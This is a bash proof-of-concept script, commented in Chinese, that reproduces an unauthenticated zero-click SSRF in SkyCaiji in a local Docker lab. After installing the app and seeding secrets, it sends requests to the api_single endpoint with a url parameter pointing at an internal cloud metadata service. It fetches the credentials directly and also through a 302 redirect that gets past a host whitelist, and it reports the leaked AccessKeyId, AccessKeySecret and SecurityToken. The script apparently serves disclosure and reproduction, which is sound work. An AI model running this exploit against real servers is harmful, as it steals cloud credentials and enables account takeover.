#!/usr/bin/env bash
# 一键复现：SkyCaiji 未认证 0-click SSRF → 云元数据 → 临时 AK/SK 泄漏
# 前置：docker compose up -d --build  已启动 app/db/meta 三个容器
set -u
BASE="http://127.0.0.1:8899/index.php"
J="$(mktemp)"

echo "==> [1/4] 等待 MySQL 就绪"
for i in $(seq 1 60); do
  if docker exec sc-db mysqladmin ping -proot123 >/dev/null 2>&1; then echo "    MySQL up"; break; fi
  sleep 1
done

echo "==> [2/4] 以普通安装流程安装 SkyCaiji（模拟运维正常安装；非漏洞环节）"
# step2：配置数据库 + 创始人账号（写入 cache(install_config)）
curl -s -c "$J" -b "$J" "$BASE?s=/install/index/step2" \
  --data-urlencode "db_host=db" --data-urlencode "db_port=3306" \
  --data-urlencode "db_name=skycaiji" --data-urlencode "db_user=root" \
  --data-urlencode "db_pwd=root123" --data-urlencode "db_prefix=sky" \
  --data-urlencode "user_name=admin" --data-urlencode "user_pwd=admin888" \
  --data-urlencode "user_repwd=admin888" --data-urlencode "user_email=admin@test.com" >/dev/null
# step3：建库建表、写 config.php、建管理员、置 install.lock
curl -s -c "$J" -b "$J" "$BASE?s=/install/index/step3" | grep -aoE "安装完成" | head -1

echo "==> [3/4] 导入“受害者管理员已有配置”：各类机密 + 开启的单页采集任务（无接口密钥）"
docker exec -i sc-db mysql -uroot -proot123 skycaiji < "$(dirname "$0")/sql/seed.sql" 2>/dev/null | grep -A1 seeded_task_id
docker exec sc-app sh -lc 'rm -rf /var/www/html/runtime/cache/* 2>/dev/null' || true

echo
echo "==> [4/4] 发起【未认证 0-click】攻击（不带任何 Cookie / 凭据）"
echo "    攻击者无法直接访问内网元数据服务，但可借 SkyCaiji 服务端去访问并取回响应："
echo
echo "    (a) 直接 SSRF 到内网元数据："
URL1="$BASE/api_single/1?url=http://metadata.internal/latest/meta-data/ram/security-credentials/myrole"
echo "    GET $URL1"
curl -s "$URL1"; echo
echo
echo "    (b) 经 302 重定向跟随到内网元数据（绕过潜在首跳 host 白名单）："
URL2="$BASE/api_single/1?url=http://metadata.internal/redirect"
echo "    GET $URL2"
curl -s "$URL2"; echo
echo
echo "==> 完成。响应 data[0].content.value 中的 AccessKeyId/AccessKeySecret/SecurityToken 即被泄漏的临时 AK/SK。"
rm -f "$J"
